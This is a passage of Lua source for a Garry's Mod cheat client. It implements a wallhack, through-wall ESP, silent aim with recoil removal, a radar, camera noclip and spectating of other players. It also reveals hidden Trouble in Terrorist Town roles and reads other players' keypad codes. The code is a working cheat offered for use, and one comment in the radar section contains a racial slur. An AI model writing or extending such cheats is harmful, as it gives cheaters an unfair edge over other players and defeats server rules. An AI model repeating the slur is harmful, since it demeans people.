--[[	if( me:GetActiveWeapon():Clip1() <= 0 and CurTime() > ( NH.AutoReload.LastReload + 5 ) ) then
		Module.INillarhHack.RunConsoleCommand( "+reload" )
		NH.AutoReload.LastReload = CurTime()
		NH.AutoReload.Reloadspeed = CurTime() + me:GetActiveWeapon():GetViewModel():SequenceDuration()
		timer.Simple( 5, function()
			Module.INillarhHack.RunConsoleCommand( "-reload" )
		end )
	end]]
end

// ============================= Wallhack ============================= //

NH.Wallhack = {};

function NH.Wallhack.OnScreen(ent)
	a, f = r["Player"]["GetAimVector"](me):Angle() - (ent:GetPos() - me:GetShootPos()):Angle(), r["Player"]["GetFOV"](me) 
	return (g.math.NormalizeAngle(a.y) < f + 2 && g.math.NormalizeAngle(a.p) < f + 2) 
end

function NH.Wallhack.CanDraw( ent )

	if ( !ent || !g.IsValid( ent ) /*|| Module.INillarhHack.IsDormant( r["Entity"]["EntIndex"]( ent ) )*/ ) then return false; end

	if ( !NH.Wallhack.OnScreen( ent ) ) then return false; end

	if ( NH.IsPlayer( ent ) && ! r["Player"]["Alive"]( ent ) ) then return false; end
	if ( NH.IsPlayer( ent ) && r["Player"]["Team"] == TEAM_SPECTATOR ) then return false; end

	return true;

end

function NH.Wallhack.GetInfo( ent )

	local header = {};
	local footer = {};
	local infobar = {};
	
	// Check if they have administrative powers

	local Admin, Type = NH.AdminReturn( ent )

/*	if ( r["Entity"]["GetNetworkedBool"]( ent, "usergroup" ) == "superadmin" ) then 

		header[ "SUPER-ADMIN" ] = g.Color( 255, 0, 0, 255 );

	elseif ( r["Entity"]["GetNetworkedBool"]( ent, "usergroup" ) == "admin" ) then 

		header[ "ADMIN" ] = g.Color( 255, 0, 0, 255 );*/

	if ( Admin == true ) then

		header[ g.string.upper( Type ) ] = g.Color( 255, 0, 0, 255 );

	elseif ( r["Entity"]["GetNetworkedBool"]( ent, "usergroup" ) && g.isstring( r["Entity"]["GetNetworkedBool"]( ent, "usergroup" ) ) ) then 

		header[ r["Entity"]["GetNetworkedBool"]( ent, "usergroup" ):upper() ] = g.team.GetColor();

	end

	// Check what role they play in TTT - functions will always return false if the gamemode isn't TTT

	if ( NH.IsTraitor( ent ) ) then

		header["TRAITOR"] = g.Color( 255, 0, 0, 255 );

	elseif ( NH.IsInnocent( ent ) ) then 

		header["INNOCENT"] = g.Color( 0, 255, 0, 255 );

	elseif ( NH.IsDetective( ent ) ) then 

		header["DETECTIVE"] = g.Color( 0, 0, 255, 255 );

	end 

	local dist = r["Vector"]["DistToSqr"]( r["Entity"]["GetPos"]( me ), r["Entity"]["GetPos"]( ent ) );

	if ( NH.IsPlayer( ent ) ) then 

		local health, armor = r["Entity"]["Health"]( ent ), r["Player"]["Armor"]( ent );
		local weapon = r["Player"]["GetActiveWeapon"]( ent );

		if ( health > 0 ) then infobar[ "HP : " .. health ] = g.Color( 255 - health * 2.55, health * 2.55, 0, 255 ); end

		if ( armor > 0 ) then infobar[ "AR : " .. armor ] = g.Color( 255 - armor * 2.55, armor * 2.55, 0, 255 ); end
		if ( weapon && g.IsValid( weapon ) ) then infobar[ "WEP : " .. r["Entity"]["GetClass"]( weapon ) ] = NH.Get( "Wallhack", "text_colour" ); end

		infobar[ "DIST : " .. g.math.Round( dist / 16 ) .. "ft" ] = NH.Get( "Wallhack", "text_colour" );
		infobar[ "NAME : " .. r["Player"]["Nick"]( ent ) ] = NH.Get( "Wallhack", "text_colour" );

		footer[ r["Player"]["Nick"]( ent ) ] = g.Color( 255, 255, 255, 255 );

	else 

		infobar[ "CLASS : " .. r["Entity"]["GetClass"]( ent ) ] = NH.Get( "Wallhack", "text_colour" );
		infobar[ "DIST : " .. g.math.Round( dist / 16 ) .. "ft" ] = NH.Get( "Wallhack", "text_colour" );

	end



	return { header = header, infobar = infobar, footer = footer };

end

function NH.Wallhack.GetColour( ent )

//	if ( g.isentity( ent ) ) then return NH.Get( "Wallhack", "non_ent_colour" ); end
	if ( NH.Aimbot.BestTarget == ent ) then return g.Color( 255, 255, 255, 255 ); end

//	if ( NH:IsAdmin( v ) ) then return g.Color( 255, 0, 0, 255 ); end

	if ( NH.IsFriend( ent ) ) then return NH.Get( "Wallhack", "friend_colour" ); end

	if ( NH.IsDetective( ent ) ) then return g.Color( 0, 0, 255, 255 ); end
	if ( NH.IsInnocent( ent ) ) then return g.Color( 0, 255, 0, 255 ); end
	if ( NH.IsTraitor( ent ) ) then return g.Color( 255, 0, 0, 255 ); end
	
	if ( IsDRP == true ) then return g.team.GetColor( e:Team() ); end
	
	if ( !NH.IsPlayer( ent ) ) then return NH.Get( "Wallhack", "non_ent_colour" ); end
	if ( NH.Aimbot.CanTarget( ent ) ) then return NH.Get( "Wallhack", "target_colour" ); end

	return g.team.GetColor( ent:Team() )

end

function NH.Wallhack.Draw()

	if ( !NH.Get( "Wallhack", "enabled" ) ) then return; end

	for _, ent in g.pairs( NH.Wallhack.GetTargets() ) do

		if ( ent == me ) then continue; end

		if ( !NH.Wallhack.CanDraw( ent ) ) then continue; end
		if ( NH.Get( "Wallhack", "check_ab_compat" ) && !NH.Aimbot.CanTarget( ent ) ) then continue; end

		local mid = r["Entity"]["LocalToWorld"]( ent, r["Entity"]["OBBCenter"]( ent ) );
		local min, max = r["Entity"]["WorldSpaceAABB"]( ent );

		local average = ( max - min );

		// Vector points
		local front,  back = r["Entity"]["GetForward"]( ent ) * ( average.y * 0.50 ), 	( -r["Entity"]["GetForward"]( ent ) ) * ( average.y * 0.50 ); 
		local right,  left = r["Entity"]["GetRight"]( ent ) *   ( average.x * 0.50 ), 	( -r["Entity"]["GetRight"]( ent ) ) * 	( average.x * 0.50 ); 
		local bottom, top  = r["Entity"]["GetUp"]( ent ) * 	  ( average.z * 0.50 ), 	( -r["Entity"]["GetUp"]( ent ) ) * 		( average.z * 0.50 ); 

		// Screen points
		local fRightTop 	= r["Vector"]["ToScreen"]( mid + front + right + top );
		local fLeftTop  	= r["Vector"]["ToScreen"]( mid + front + left + top );

		local bRightTop 	= r["Vector"]["ToScreen"]( mid + back + right + top );
		local bLefttop  	= r["Vector"]["ToScreen"]( mid + back + right + top );

		local fRightBottom	= r["Vector"]["ToScreen"]( mid + front + right + bottom );
		local fLeftBottom 	= r["Vector"]["ToScreen"]( mid + front + left + bottom );

		local bRightBottom 	= r["Vector"]["ToScreen"]( mid + back + right + bottom );
		local bLeftBottom 	= r["Vector"]["ToScreen"]( mid + back + left + bottom );
		
		// *Actual* screen points
		local maxX = g.math.max( fRightTop.x, fLeftTop.x, bRightTop.x, bLefttop.x, fRightBottom.x, fLeftBottom.x, bRightBottom.x, bLeftBottom.x );
		local minX = g.math.min( fRightTop.x, fLeftTop.x, bRightTop.x, bLefttop.x, fRightBottom.x, fLeftBottom.x, bRightBottom.x, bLeftBottom.x );

		local maxY = g.math.max( fRightTop.y, fLeftTop.y, bRightTop.y, bLefttop.y, fRightBottom.y, fLeftBottom.y, bRightBottom.y, bLeftBottom.y );
		local minY = g.math.min( fRightTop.y, fLeftTop.y, bRightTop.y, bLefttop.y, fRightBottom.y, fLeftBottom.y, bRightBottom.y, bLeftBottom.y );

		local width  = maxX - minX;
		local height = maxY - minY;

		local lineWidth = NH.Get( "Wallhack", "width" );

		local DerpSonKill = ( ent:GetPos() + g.Vector( 0, 0, 69 ) ):ToScreen()

--[[		local pos = ent:GetPos();
		g.surface.SetDrawColor( NH.Wallhack.GetColour( ent ) )
		g.surface.DrawLine( ( ScrW() / 2 ), ( ScrH() / 2 ), pos.x, pos.y )]]
		
		// Lines
		g.surface.SetDrawColor( NH.Wallhack.GetColour( ent ) );

		// Bottom left seg ->
		g.surface.DrawRect( minX, minY - lineWidth, ( width / 3 ), lineWidth );
		// Bottom left seg /\
		g.surface.DrawRect( minX, minY, lineWidth, ( height / 3 ) );

		// Bottom Right seg <-
		g.surface.DrawRect( maxX - ( width / 3 ), minY - lineWidth, width / 3, lineWidth );
		// Bottom right seg /\
		g.surface.DrawRect( maxX, minY, lineWidth, height / 3 );

		// Top left seg ->
		g.surface.DrawRect( minX, maxY - lineWidth, width / 3, lineWidth );
		// Top left seg \/
		g.surface.DrawRect( minX, maxY - ( height / 3 ), lineWidth, height / 3 );

		// Top Right seg <-
		g.surface.DrawRect( maxX - ( width / 3 ), maxY - lineWidth, width / 3, lineWidth );
		// Top right seg \/
		g.surface.DrawRect( maxX, maxY - ( height / 3 ), lineWidth, height / 3 );

		// Text

		local info = NH.Wallhack.GetInfo( ent );

		local i = 0;
		for str, col in g.pairs( info.header ) do 

			g.draw.SimpleText( str, "DefaultFixed", maxX - ( maxX - minX ) * 0.50, maxY + i, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER );
			i = i + 10

		end

		local i = 0;
		for str, col in g.pairs( info.footer ) do 

			g.draw.SimpleText( str, "DefaultFixed", maxX - ( maxX - minX ) * 0.50, minY + i, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER );
			i = i + 10;

		end

		if ( height >= 25 ) then 

			local i = 10;
			for str, col in g.SortedPairs( info.infobar ) do 

				g.draw.SimpleText( str, "DefaultFixed", maxX, minY + i, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER );
				i = i + 10;

			end

		end

/*		local listpos = ScrH() / 3.5
		
		g.draw.SimpleTextOutlined( NH.GUI.Console.RichText:GetValue(), "DefaultFixed", 2, listpos, Color( 255, 80, 80, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT, 1, Color( 0, 0, 0, 255 ) );
		listpos = listpos + 12;*/

		local POS = ( ent:GetPos() ):ToScreen()

		// Keypad Cracker
		local e = me:GetEyeTrace().Entity
		if g.IsValid(e) and g.string.find(e:GetClass(), "keypad") then
			local text = e.code or "Not Found"
			g.draw.WordBox( 8, g.ScrW() / 2, g.ScrH() / 2, text, "Default", g.Color(50,50,75,100), g.Color(255,255,255,255) )
		end

		if g.string.find(ent:GetClass(), "keypad") then
			if ent != e then
				if ent.code then
					g.draw.RoundedBox( 4, POS.x-5, POS.y-5, 20, 20, g.Color( 0, 255, 0, 150 ) )
				else
					g.draw.RoundedBox( 4, POS.x-5, POS.y-5, 20, 20, g.Color( 255, 0, 0, 150 ) )
				end
			end
		end


		// Stop it slender
		if IsSis == true then
			if ( ent:IsSlenderman() ) then
				g.draw.SimpleText( "Page", "TabLarge", POS['x'], POS['y'], g.Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			end
	
			for _, ent in g.pairs(g.ents.FindByClass("page")) do
				if ( not ent.Taken ) then
					g.draw.SimpleText( "Page", "TabLarge", POS['x'], POS['y'], g.Color(255, 140, 0, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
		end

		// DarkRP
		if IsDRP == true then
			if ent:GetClass() == "spawned_money" then
				g.draw.SimpleText( "Money: $" .. ent.dt.amount, "TabLarge", POS['x'], POS['y'], g.Color( 0, 255, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			end

			if ent:GetClass() == "spawned_shipment" and ent:GetMoveType() != 0 then
				local content = ent.dt.contents
				local contents = CustomShipments[content]
				contents = contents.name
				g.draw.SimpleText( "Shipment: " .. contents, "TabLarge", POS['x'], POS['y'], g.Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				g.draw.SimpleText( "Count: " .. ent.dt.count, "TabLarge", POS['x'], POS['y'] + 22, g.Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			end
		end

		// Morbus
		for k, v in g.pairs(ent:GetWeapons()) do
			if g.string.find(v:GetPrintName(), "Alien") then
				g.draw.SimpleText( "[ALIEN]", "TabLarge", DerpSonKill['x'], DerpSonKill['y'] - 20, g.Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			end
		end

		// TTT
		if IsTTT == true then

			for k, v in g.pairs( g.ents.FindByClass( "ttt_c4" ) ) do
				if v:GetPos():Distance( me:GetPos() ) < 1000 and v:GetArmed() then
					g.draw.DrawText( "C4 (In range of explosion!) - "..g.string.FormattedTime(v:GetExplodeTime() - g.CurTime(), "%02i:%02i"), "Default", v:GetPos():ToScreen().x, v:GetPos():ToScreen().y-g.surface.GetTextSize( "C4" )/2, g.Color( 255, 200, 200, 255 ), 1 );
				else
					g.draw.DrawText( !v:GetArmed() and "C4 - Unarmed" or "C4 - "..g.string.FormattedTime(v:GetExplodeTime() - g.CurTime(), "%02i:%02i"), "Default", v:GetPos():ToScreen().x, v:GetPos():ToScreen().y-g.surface.GetTextSize( "C4" )/2, g.Color( 255, 200, 200, 255 ), 1 );
				end
			end

			for k, v in g.pairs( g.ents.FindByClass( "prop_ragdoll" ) ) do
				local name = CORPSE.GetPlayerNick( v, false );
				
				if ( name != false ) then
					local width, height = g.surface.GetTextSize( name );

					g.draw.DrawText( name, "Default", POS.x, POS.y-height/2, g.Color( 255, 255, 255, 255 ), 1 );
					if ( !CORPSE.GetFound(v, false) ) then
						g.draw.DrawText( "Unidentified", "Default", POS.x, POS.y-height/2+12, g.Color( 200, 200, 0, 255 ), 1 );
					end
				end
			end

		end

	end 

end

function NH.Wallhack.GetTargets()

	return g.table.Add( g.player.GetAll(), g.ents.FindByClass( NH.Get( "Wallhack", "ent_pattern" ) ) ); 

end

// ============================= ESP / Xray ============================= //

NH.ESP = {};

NH.ESP.WireframeMat = g.CreateMaterial( "NHWireframe", "Wireframe", { 
	["$basetexture"] = "models/wireframe",
	["$ignorez"] = 1
});

NH.ESP.SolidBGMat 	= g.CreateMaterial( "NHSolidBG", "UnlitGeneric", {
	["$basetexture"] = "models/debug/debugwhite",
	["$ignorez"] = 1
} );

NH.ESP.XyzMat		= g.CreateMaterial( "NHXyzMat", "VertexLitGeneric", { 
	["$basetexture"] = "models/debug/debugwhite", 
	["$model"] = 1, 
	["$ignorez"] = 1 
} );

function NH.ESP.GetColour( ent )

 return NH.Wallhack.GetColour( ent )

--	if ( g.isentity( ent ) ) then return NH.Get( "ESP", "non_ent_colour" ); end

--	if ( NH.IsFriend( ent ) ) then return NH.Get( "ESP", "friend_colour" ); end
--	if ( !NH.IsPlayer( ent ) ) then return NH.Get( "ESP", "non_ent_colour" ); end

--	if ( NH.Aimbot.CanTarget( ent ) ) then 

--		return NH.Get( "ESP", "target_colour" ); 

--	else 

--		return NH.Get( "ESP", "ntarget_colour" ); 

--	end

end

function NH.ESP.CanDraw( ent )

	if ( !ent || !g.IsValid( ent ) /*|| Module.INillarhHack.IsDormant( r["Entity"]["EntIndex"]( ent ) )*/ ) then return false; end

	if ( !NH.Wallhack.OnScreen( ent ) ) then return false; end

	if ( NH.IsPlayer( ent ) && ! r["Player"]["Alive"]( ent ) ) then return false; end
	if ( NH.IsPlayer( ent ) && r["Player"]["Team"] == g.TEAM_SPECTATOR ) then return false; end

	return true;

end

/*
"wireframe"
"mat"
"solid"
*/

function NH.ESP.Draw()

	if ( !NH.Get( "ESP", "enabled" ) ) then return; end

	g.cam.Start3D( g.EyePos(), g.EyeAngles() );

	g.cam.IgnoreZ( true );

	for _, ply in g.pairs( NH.ESP.GetTargets() ) do 

		if ( NH.Get( "ESP", "check_ab_compat" ) && !NH.Aimbot.CanTarget( ply ) ) then continue; end
		if ( NH.Get( "ESP", "max_distance" ) != 0 && r["Vector"]["Distance"]( r["Entity"]["GetPos"]( me ), r["Entity"]["GetPos"]( ply ) ) > NH.Get( "ESP", "max_distance" ) ) then continue; end
		if ( !NH.ESP.CanDraw( ply ) ) then continue; end

		if ( g.IsValid( ply ) && ply != me ) then 

			local col = NH.ESP.GetColour( ply );

			g.render.SetColorModulation( col.r / 255, col.g / 255, col.b / 255 );
			g.render.SetBlend( col.a / 255 );

			g.render.MaterialOverride( NH.Get( "ESP", "draw_mat" ):lower() == "wireframe" and NH.ESP.WireframeMat or ( NH.Get( "ESP", "draw_mat" ):lower() == "mat" and NH.ESP.XyzMat ) or NH.ESP.SolidBGMat );

			if ( g.IsValid( ply:GetActiveWeapon() ) ) then

				ply:GetActiveWeapon():DrawModel();

			end

			ply:DrawModel();

			g.render.MaterialOverride( nil );

		end

	end
	
	for _, ent in g.pairs( g.ents.GetAll() ) do

		if ent:GetClass() == "prop_ragdoll" then
			if ( IsTTT == true and CORPSE.GetPlayerNick(ent, false) != false ) then
				g.cam.Start3D( me:EyePos(), me:EyeAngles() );
					g.render.SuppressEngineLighting( true );
					g.render.SetColorModulation( 1, 0.8, 0.5, 1 );
					g.render.MaterialOverride( NH.ESP.SolidBGMat );
					ent:DrawModel( );

					g.render.SetColorModulation( 1, 1, 1, 1 );
					g.render.MaterialOverride();
					g.render.SetModelLighting( g.BOX_TOP, 1, 1, 1 )
					ent:DrawModel();

					g.render.SuppressEngineLighting( false );
				g.cam.End3D();
			end
		end

	end

	g.cam.IgnoreZ( false );

	g.cam.End3D();
	
end

function NH.ESP.GetTargets()

	return g.table.Add( g.player.GetAll(), g.ents.FindByClass( NH.Get( "ESP", "ent_pattern" ) ) );

end


// ============================= Laser Eyes ============================= //

// ============================= LaserSights ============================= //

NH.LaserSights = {};

function NH.LaserSights.GetTargets()

	return g.player.GetAll();

end

NH.LaserSights.Mat = g.Material( "sprites/bluelaser1" );

function NH.LaserSights.Draw()

	if ( !NH.Get( "LaserSights", "enabled" ) ) then return; end
	if ( !NH.Aimbot.CanFire() ) then return; end

	g.cam.Start3D( g.EyePos(), g.EyeAngles() );

		local mbarrel = r["Player"]["GetViewModel"]( me );
		local abarrel = r["Entity"]["GetAttachment"]( mbarrel, "1" );

		g.render.SetMaterial( NH.LaserSights.Mat );

		if ( !abarrel ) then g.cam.End3D(); return; end

		// Idle

		local length = NH.Get( "LaserSights", "length" );
		if ( !NH.Aimbot.CanTarget( NH.Aimbot.BestTarget ) ) then 

			if ( NH.Get( "LaserSights", "draw_idle" ) ) then 

				local endP = ( length > 0 and r["Angle"]["Forward"]( g.EyeAngles() ) * length or me:GetEyeTrace().HitPos );

				if ( endP ) then g.render.DrawBeam( abarrel.Pos, endP, NH.Get( "LaserSights", "width" ) , 5, 5, NH.Get( "LaserSights", "idle_colour" ) ); end

			end

		else 

			if ( NH.Get( "LaserSights", "draw_target" ) ) then 

				local endP = NH.Aimbot.FindPoint( NH.Aimbot.BestTarget );

				if ( endP ) then g.render.DrawBeam( abarrel.Pos, endP, NH.Get( "LaserSights", "width" ) , 5, 5, NH.Get( "LaserSights", "target_colour" ) ); end

			end

		end

		// All / Visible

		if ( NH.Get( "LaserSights", "draw_all" ) || NH.Get( "LaserSights", "draw_visible" ) ) then 

			for _, ply in g.pairs( NH.LaserSights.GetTargets() ) do
			
				if ( NH.Get( "LaserSights", "draw_target" ) && ply == NH.Aimbot.BestTarget ) then continue; end
				if ( ply == me ) then continue; end

				if ( !NH.Get( "LaserSights", "check_ab_compat" ) || NH.Aimbot.CanTarget( ply ) ) then 

					if ( NH.Get( "LaserSights", "draw_visible" ) ) then 

						local point = NH.Aimbot.FindPoint( ply );

						if ( Module.INillarhHack.IsVisible( r["Player"]["GetShootPos"]( me ), point, r["Entity"]["EntIndex"]( ply ) ) ) then 

							g.render.DrawBeam( abarrel.Pos, point, NH.Get( "LaserSights", "width" ) , 5, 5, NH.Get( "LaserSights", "visible_colour" ) );
							continue;

						end

					end

					if ( NH.Get( "LaserSights", "draw_all" ) ) then 

						local endP = NH.Aimbot.FindPoint( ply );

						if ( endP ) then g.render.DrawBeam( abarrel.Pos, endP, NH.Get( "LaserSights", "width" ) , 5, 5, NH.Get( "LaserSights", "all_colour" ) ); end

					end

				end				

			end

		end

	g.cam.End3D();

end

// ============================= Silent Aim ============================= //

NH.SilentAim = {};
NH.SilentAim.Angle = g.Angle( 0, 0, 0 );
NH.SilentAim.IsEngaged = false;

/*function NH.SilentAim.BetterCalcView( ply, pos, angles, fov, znear, zfar )

	local wep = r["Player"]["GetActiveWeapon"]( me );

	local view = {}
	view.pos = pos,
	view.angles = angles,
	view.fov = fov,
	view.znear = znear,
	view.zfar = zfar,
	view.drawviewer = false

	g.player_manager.RunClass( ply, "CalcView", view );

	if ( g.IsValid( wep ) ) then

		local func = wep.GetViewModelPosition
		if ( func ) then
			view.vm_origin,  view.vm_angles = func( wep, pos*1, angles*1 );
		end

		local func = wep.CalcView
		if ( func ) then
			view.pos, view.angles, view.fov = func( wep, ply, pos*1, angles*1, fov );
		end

	end

	return view

end*/

function NH.SilentAim.CalcView( ply, pos, angles, fov, znear, zfar, ... )

	local wep = r["Player"]["GetActiveWeapon"]( me );

	if ( NH.Get( "Aimbot", "sa_smooth" ) ) then 

		if ( wep && wep.Primary && wep.Primary.Recoil ) then wep.Primary.Recoil = 0; end

		angles = ( ( angles - r["Player"]["GetPunchAngle"]( me ) ) or ( ( me:GetAimVector() ):Angle() ) );
		angles.r = 0;

	end 

	if ( NH.Get( "Aimbot", "sa_enabled" ) && NH.SilentAim.IsEngaged ) then 

		angles = NH.SilentAim.Angle;

	end

	return ( GAMEMODE or GM ):CalcView( ply, pos, angles, fov, znear, zfar );

end

function NH.SilentAim.SetEngaged( cmd, bool )

	if ( bool ) then 

		NH.SilentAim.Angle = r["CUserCmd"]["GetViewAngles"]( cmd );

	else 

		Module.INillarhHack.SetViewAngles( cmd, NH.SilentAim.Angle );

	end

	NH.SilentAim.IsEngaged = bool;

end

function NH.SilentAim.SetMovement( cmd, ang )

	local MoveForwardSideUp = ((g.Vector(cmd:GetForwardMove(), cmd:GetSideMove(), cmd:GetUpMove()):GetNormal():Angle() + ( ang )):Forward() * g.Vector(cmd:GetForwardMove(), cmd:GetSideMove(), cmd:GetUpMove()):Length());

	r["CUserCmd"]["SetForwardMove"]( cmd, MoveForwardSideUp["x"] );

	r["CUserCmd"]["SetSideMove"]( cmd, MoveForwardSideUp["y"] );

	r["CUserCmd"]["SetUpMove"]( cmd, MoveForwardSideUp["z"] );

/*	local MouseXY = ((Vector(cmd:GetMouseX(), cmd:GetMouseY(), 0):GetNormal():Angle() + (SilentAimAng)):Forward() * Vector(cmd:GetMouseX(), cmd:GetMouseY(), 0):Length());

	cmd:SetMouseX(MouseXY["x"]);

	cmd:SetMouseY(MouseXY["y"]);*/

end

function NH.SilentAim.CalculateSimulatedAngles( cmd )

	if ( NH.SilentAim.IsEngaged ) then 

		local p = r["CUserCmd"]["GetMouseY"]( cmd ) *  g.tonumber( g.GetConVarString( "m_yaw" ) );
		local y = r["CUserCmd"]["GetMouseX"]( cmd ) * -g.tonumber( g.GetConVarString( "m_pitch" ) );

		NH.SilentAim.Angle = NH.SilentAim.Angle + g.Angle( g.math.NormalizeAngle( p ), g.math.NormalizeAngle( y ), 0 );

		NH.SilentAim.SetMovement( cmd, (cmd:GetViewAngles() - NH.SilentAim.Angle) )

	end

end

// ============================= Radar ============================= //

NH.Radar = {};
NH.Radar.ColTabSize = 0;
NH.Radar.ColKey = {};

function NH.Radar.GenerateColours( amount )

	NH.Radar.ColKey = {};

	local red = g.math.ceil( amount / 3 ); 
	local green = g.math.Round( amount / 3 ); 
	local blue = g.math.floor( amount / 3 );

	for i = 1, amount do 

		if ( g.player.GetAll()[ i ] == me ) then continue; end

		if ( red > 0 ) then 

			NH.Radar.ColKey[ i ] = g.Color( 255 / red, 0, 0, 255 );
			red = red - 1;

		elseif ( green > 0 ) then 

			NH.Radar.ColKey[ i ] = g.Color( 0, 255 / green, 0, 255 );
			green = green - 1;

		elseif ( blue > 0 ) then 

			NH.Radar.ColKey[ i ] = g.Color( 0, 0, 255 / blue, 255 );
			blue = blue - 1;

		end

	end

	NH.Radar.ColTabSize = amount;

end

function NH.Radar.CanDraw( ent )

	if ( !ent || !g.IsValid( ent ) /*|| Module.INillarhHack.IsDormant( r["Entity"]["EntIndex"]( ent ) )*/ ) then return false; end

	if ( NH.IsPlayer( ent ) && ! r["Player"]["Alive"]( ent ) ) then return false; end
	if ( NH.IsPlayer( ent ) && r["Player"]["Team"] == g.TEAM_SPECTATOR ) then return false; end

	return true;

end

function NH.Radar.Draw()

	if ( !NH.Get( "Radar", "enabled" ) ) then return; end

	if ( #g.player.GetAll() != NH.Radar.ColTabSize ) then NH.Radar.GenerateColours( #g.player.GetAll() ); end

	local size = NH.Get( "Radar", "size" );
	local fov  = NH.Get( "Radar", "pixrat"  );

	// Draw the background
	g.surface.SetDrawColor( g.Color( 0, 0, 0, 150 ) );
	g.surface.DrawRect( 0, 0, size, size );

	// Draw the out-lines
	if ( NH.Get( "Radar", "draw_outlines" ) ) then 

		g.surface.SetDrawColor( 255, 255, 255, 200 );

		g.surface.DrawRect( 0, 0, size, 2 );
		g.surface.DrawRect( 0, 0, 2, size );
		g.surface.DrawRect( size - 2, 0, 2, size );
		g.surface.DrawRect( 0, size - 2, size, 2 );

	end 

	// Draw the cross
	if ( NH.Get( "Radar", "draw_cross" ) ) then 

		g.surface.DrawRect( size * 0.50, 0, 1, size );
		g.surface.DrawRect( 0, size * 0.50, size, 1 );

	end

	// Draw the niggas
	for key, ply in g.pairs( NH.Radar.GetTargets() ) do 

		if ( ply == me ) then continue; end

		if ( !NH.Radar.CanDraw( ply ) ) then continue; end

		if ( !NH.Radar.ColKey[ key ] ) then continue; end // Sometimes this happens because of lag, better safe than sorry

		local x = r["Entity"]["GetPos"]( me ).x - r["Entity"]["GetPos"]( ply ).x;
		local y = r["Entity"]["GetPos"]( me ).y - r["Entity"]["GetPos"]( ply ).y;

		local ang = g.EyeAngles().y;

		local cos = g.math.cos( g.math.rad( -ang ) );
		local sin = g.math.sin( g.math.rad( -ang ) );

		local px = ( y * ( cos ) ) + ( x * sin );
		local py = ( x * ( cos ) ) - ( y * sin );

		px = px / fov;
		py = py / fov;

		px = g.math.Clamp( px, -( size * 0.50 ), size * 0.50 );
		py = g.math.Clamp( py, -( size * 0.50 ), size * 0.50 );

		g.surface.SetDrawColor( NH.Radar.ColKey[ key ] );

		g.surface.DrawRect( ( size * 0.50 ) + px - 3, ( size * 0.50 ) + py, 7, 1 );
		g.surface.DrawRect( ( size * 0.50 ) + px, ( size * 0.50 ) + py - 3, 1, 7 );

	end

	// Draw the colour key

	local x = 0;
	local y = 0;
	for key, col in g.pairs( NH.Radar.ColKey ) do 

		local ply = g.player.GetAll()[ key ];
		local name = "Unknown";

		if ( g.IsValid( ply ) ) then name = r["Player"]["Nick"]( ply ); end

		g.draw.SimpleText( name, "default", size + 10 + ( x * 200 ), 20 + ( y * 20 ), col, g.TEXT_ALIGN_LEFT, g.TEXT_ALIGN_CENTER );

		y = y + 1;
		if ( y * 20 >= size ) then x = x + 1; y = 0; end

	end

end

function NH.Radar.GetTargets()

	return g.player.GetAll();

end

// ============================= CNoClip ============================= //

NH.CNoClip = {};
NH.CNoClip.Vector = g.Vector( 0, 0, 0 );
NH.CNoClip.LastState = false;

function NH.CNoClip.CreateMove( cmd )

	if ( NH.Get( "CNoClip", "enabled" ) && !NH.Get( "CNoClip", "spectate_players" ) ) then

	    if ( !NH.CNoClip.LastState ) then 

	    	NH.CNoClip.Vector = r["Entity"]["EyePos"]( me );

	    end

	    local vo = g.Vector( 0, 0, 0 );

	    local ang = r["CUserCmd"]["GetViewAngles"]( cmd );
	  
	    if ( r["CUserCmd"]["KeyDown"]( cmd, IN_FORWARD ) ) 	then vo = vo + r["Angle"]["Forward"]( ang ); end
	    if ( r["CUserCmd"]["KeyDown"]( cmd, IN_BACK ) ) 	then vo = vo - r["Angle"]["Forward"]( ang ); end

	    if ( r["CUserCmd"]["KeyDown"]( cmd, IN_RIGHT ) ) 	then vo = vo + r["Angle"]["Right"]( ang ); end
	    if ( r["CUserCmd"]["KeyDown"]( cmd, IN_LEFT ) ) 	then vo = vo - r["Angle"]["Right"]( ang ); end

	    if ( r["CUserCmd"]["KeyDown"]( cmd, IN_JUMP ) ) 	then vo = vo + r["Angle"]["Up"]( ang ); end
	    if ( r["CUserCmd"]["KeyDown"]( cmd, IN_DUCK ) ) 	then vo = vo - r["Angle"]["Up"]( ang ); end

	   	vo = r["Vector"]["GetNormal"]( vo ) * g.FrameTime() * NH.Get( "CNoClip", "speed" );

	    if ( r["CUserCmd"]["KeyDown"]( cmd, IN_SPEED ) ) 		then vo = vo * 2; end

	    r["CUserCmd"]["SetForwardMove"]( cmd, 0 );
	    r["CUserCmd"]["SetSideMove"]( cmd, 0 );
	    r["CUserCmd"]["SetUpMove"]( cmd, 0 );
	    r["CUserCmd"]["KeyDown"]( cmd, 0 );

	    NH.CNoClip.LastState = true;
	    NH.CNoClip.Vector = NH.CNoClip.Vector + vo;

	else 

		 NH.CNoClip.LastState = false;

    end

end

function NH.CNoClip.CalcView( ply, origin, angles, fov, nearZ, farZ )

	if ( NH.Get( "CNoClip", "enabled" ) ) then 

		if ( NH.Get( "CNoClip", "spectate_players" ) ) then 

			local ply;

			for _, _ply in g.pairs( g.player.GetAll() ) do 

				if ( r["Player"]["SteamID"]( _ply ) == NH.Get( "CNoClip", "player_sid" ) || ( NH.IsBot( _ply ) && r["Player"]["Nick"]( _ply ):lower() == NH.Get( "CNoClip", "player_sid" ):lower() ) ) then 

					ply = _ply; break;

				end 

			end 

			if ( ply && g.IsValid( ply ) ) then 

				origin = r["Entity"]["EyePos"]( ply ) - ( r["Angle"]["Forward"]( r["Entity"]["EyeAngles"]( ply ) ) * 150 ) + g.Vector( 0, 0, 50 );
				angles = r["Vector"]["Angle"]( r["Entity"]["EyePos"]( ply ) - origin );

			end

		else

			origin = NH.CNoClip.Vector;

		end

	end 

--	me:ChatPrint( g.tostring( origin ) );

	// Lets call it here instead
	return NH.SilentAim.CalcView( ply, origin, angles, fov, nearZ, farZ )

end

// ============================= Binds ============================= //

NH.Binds = {};
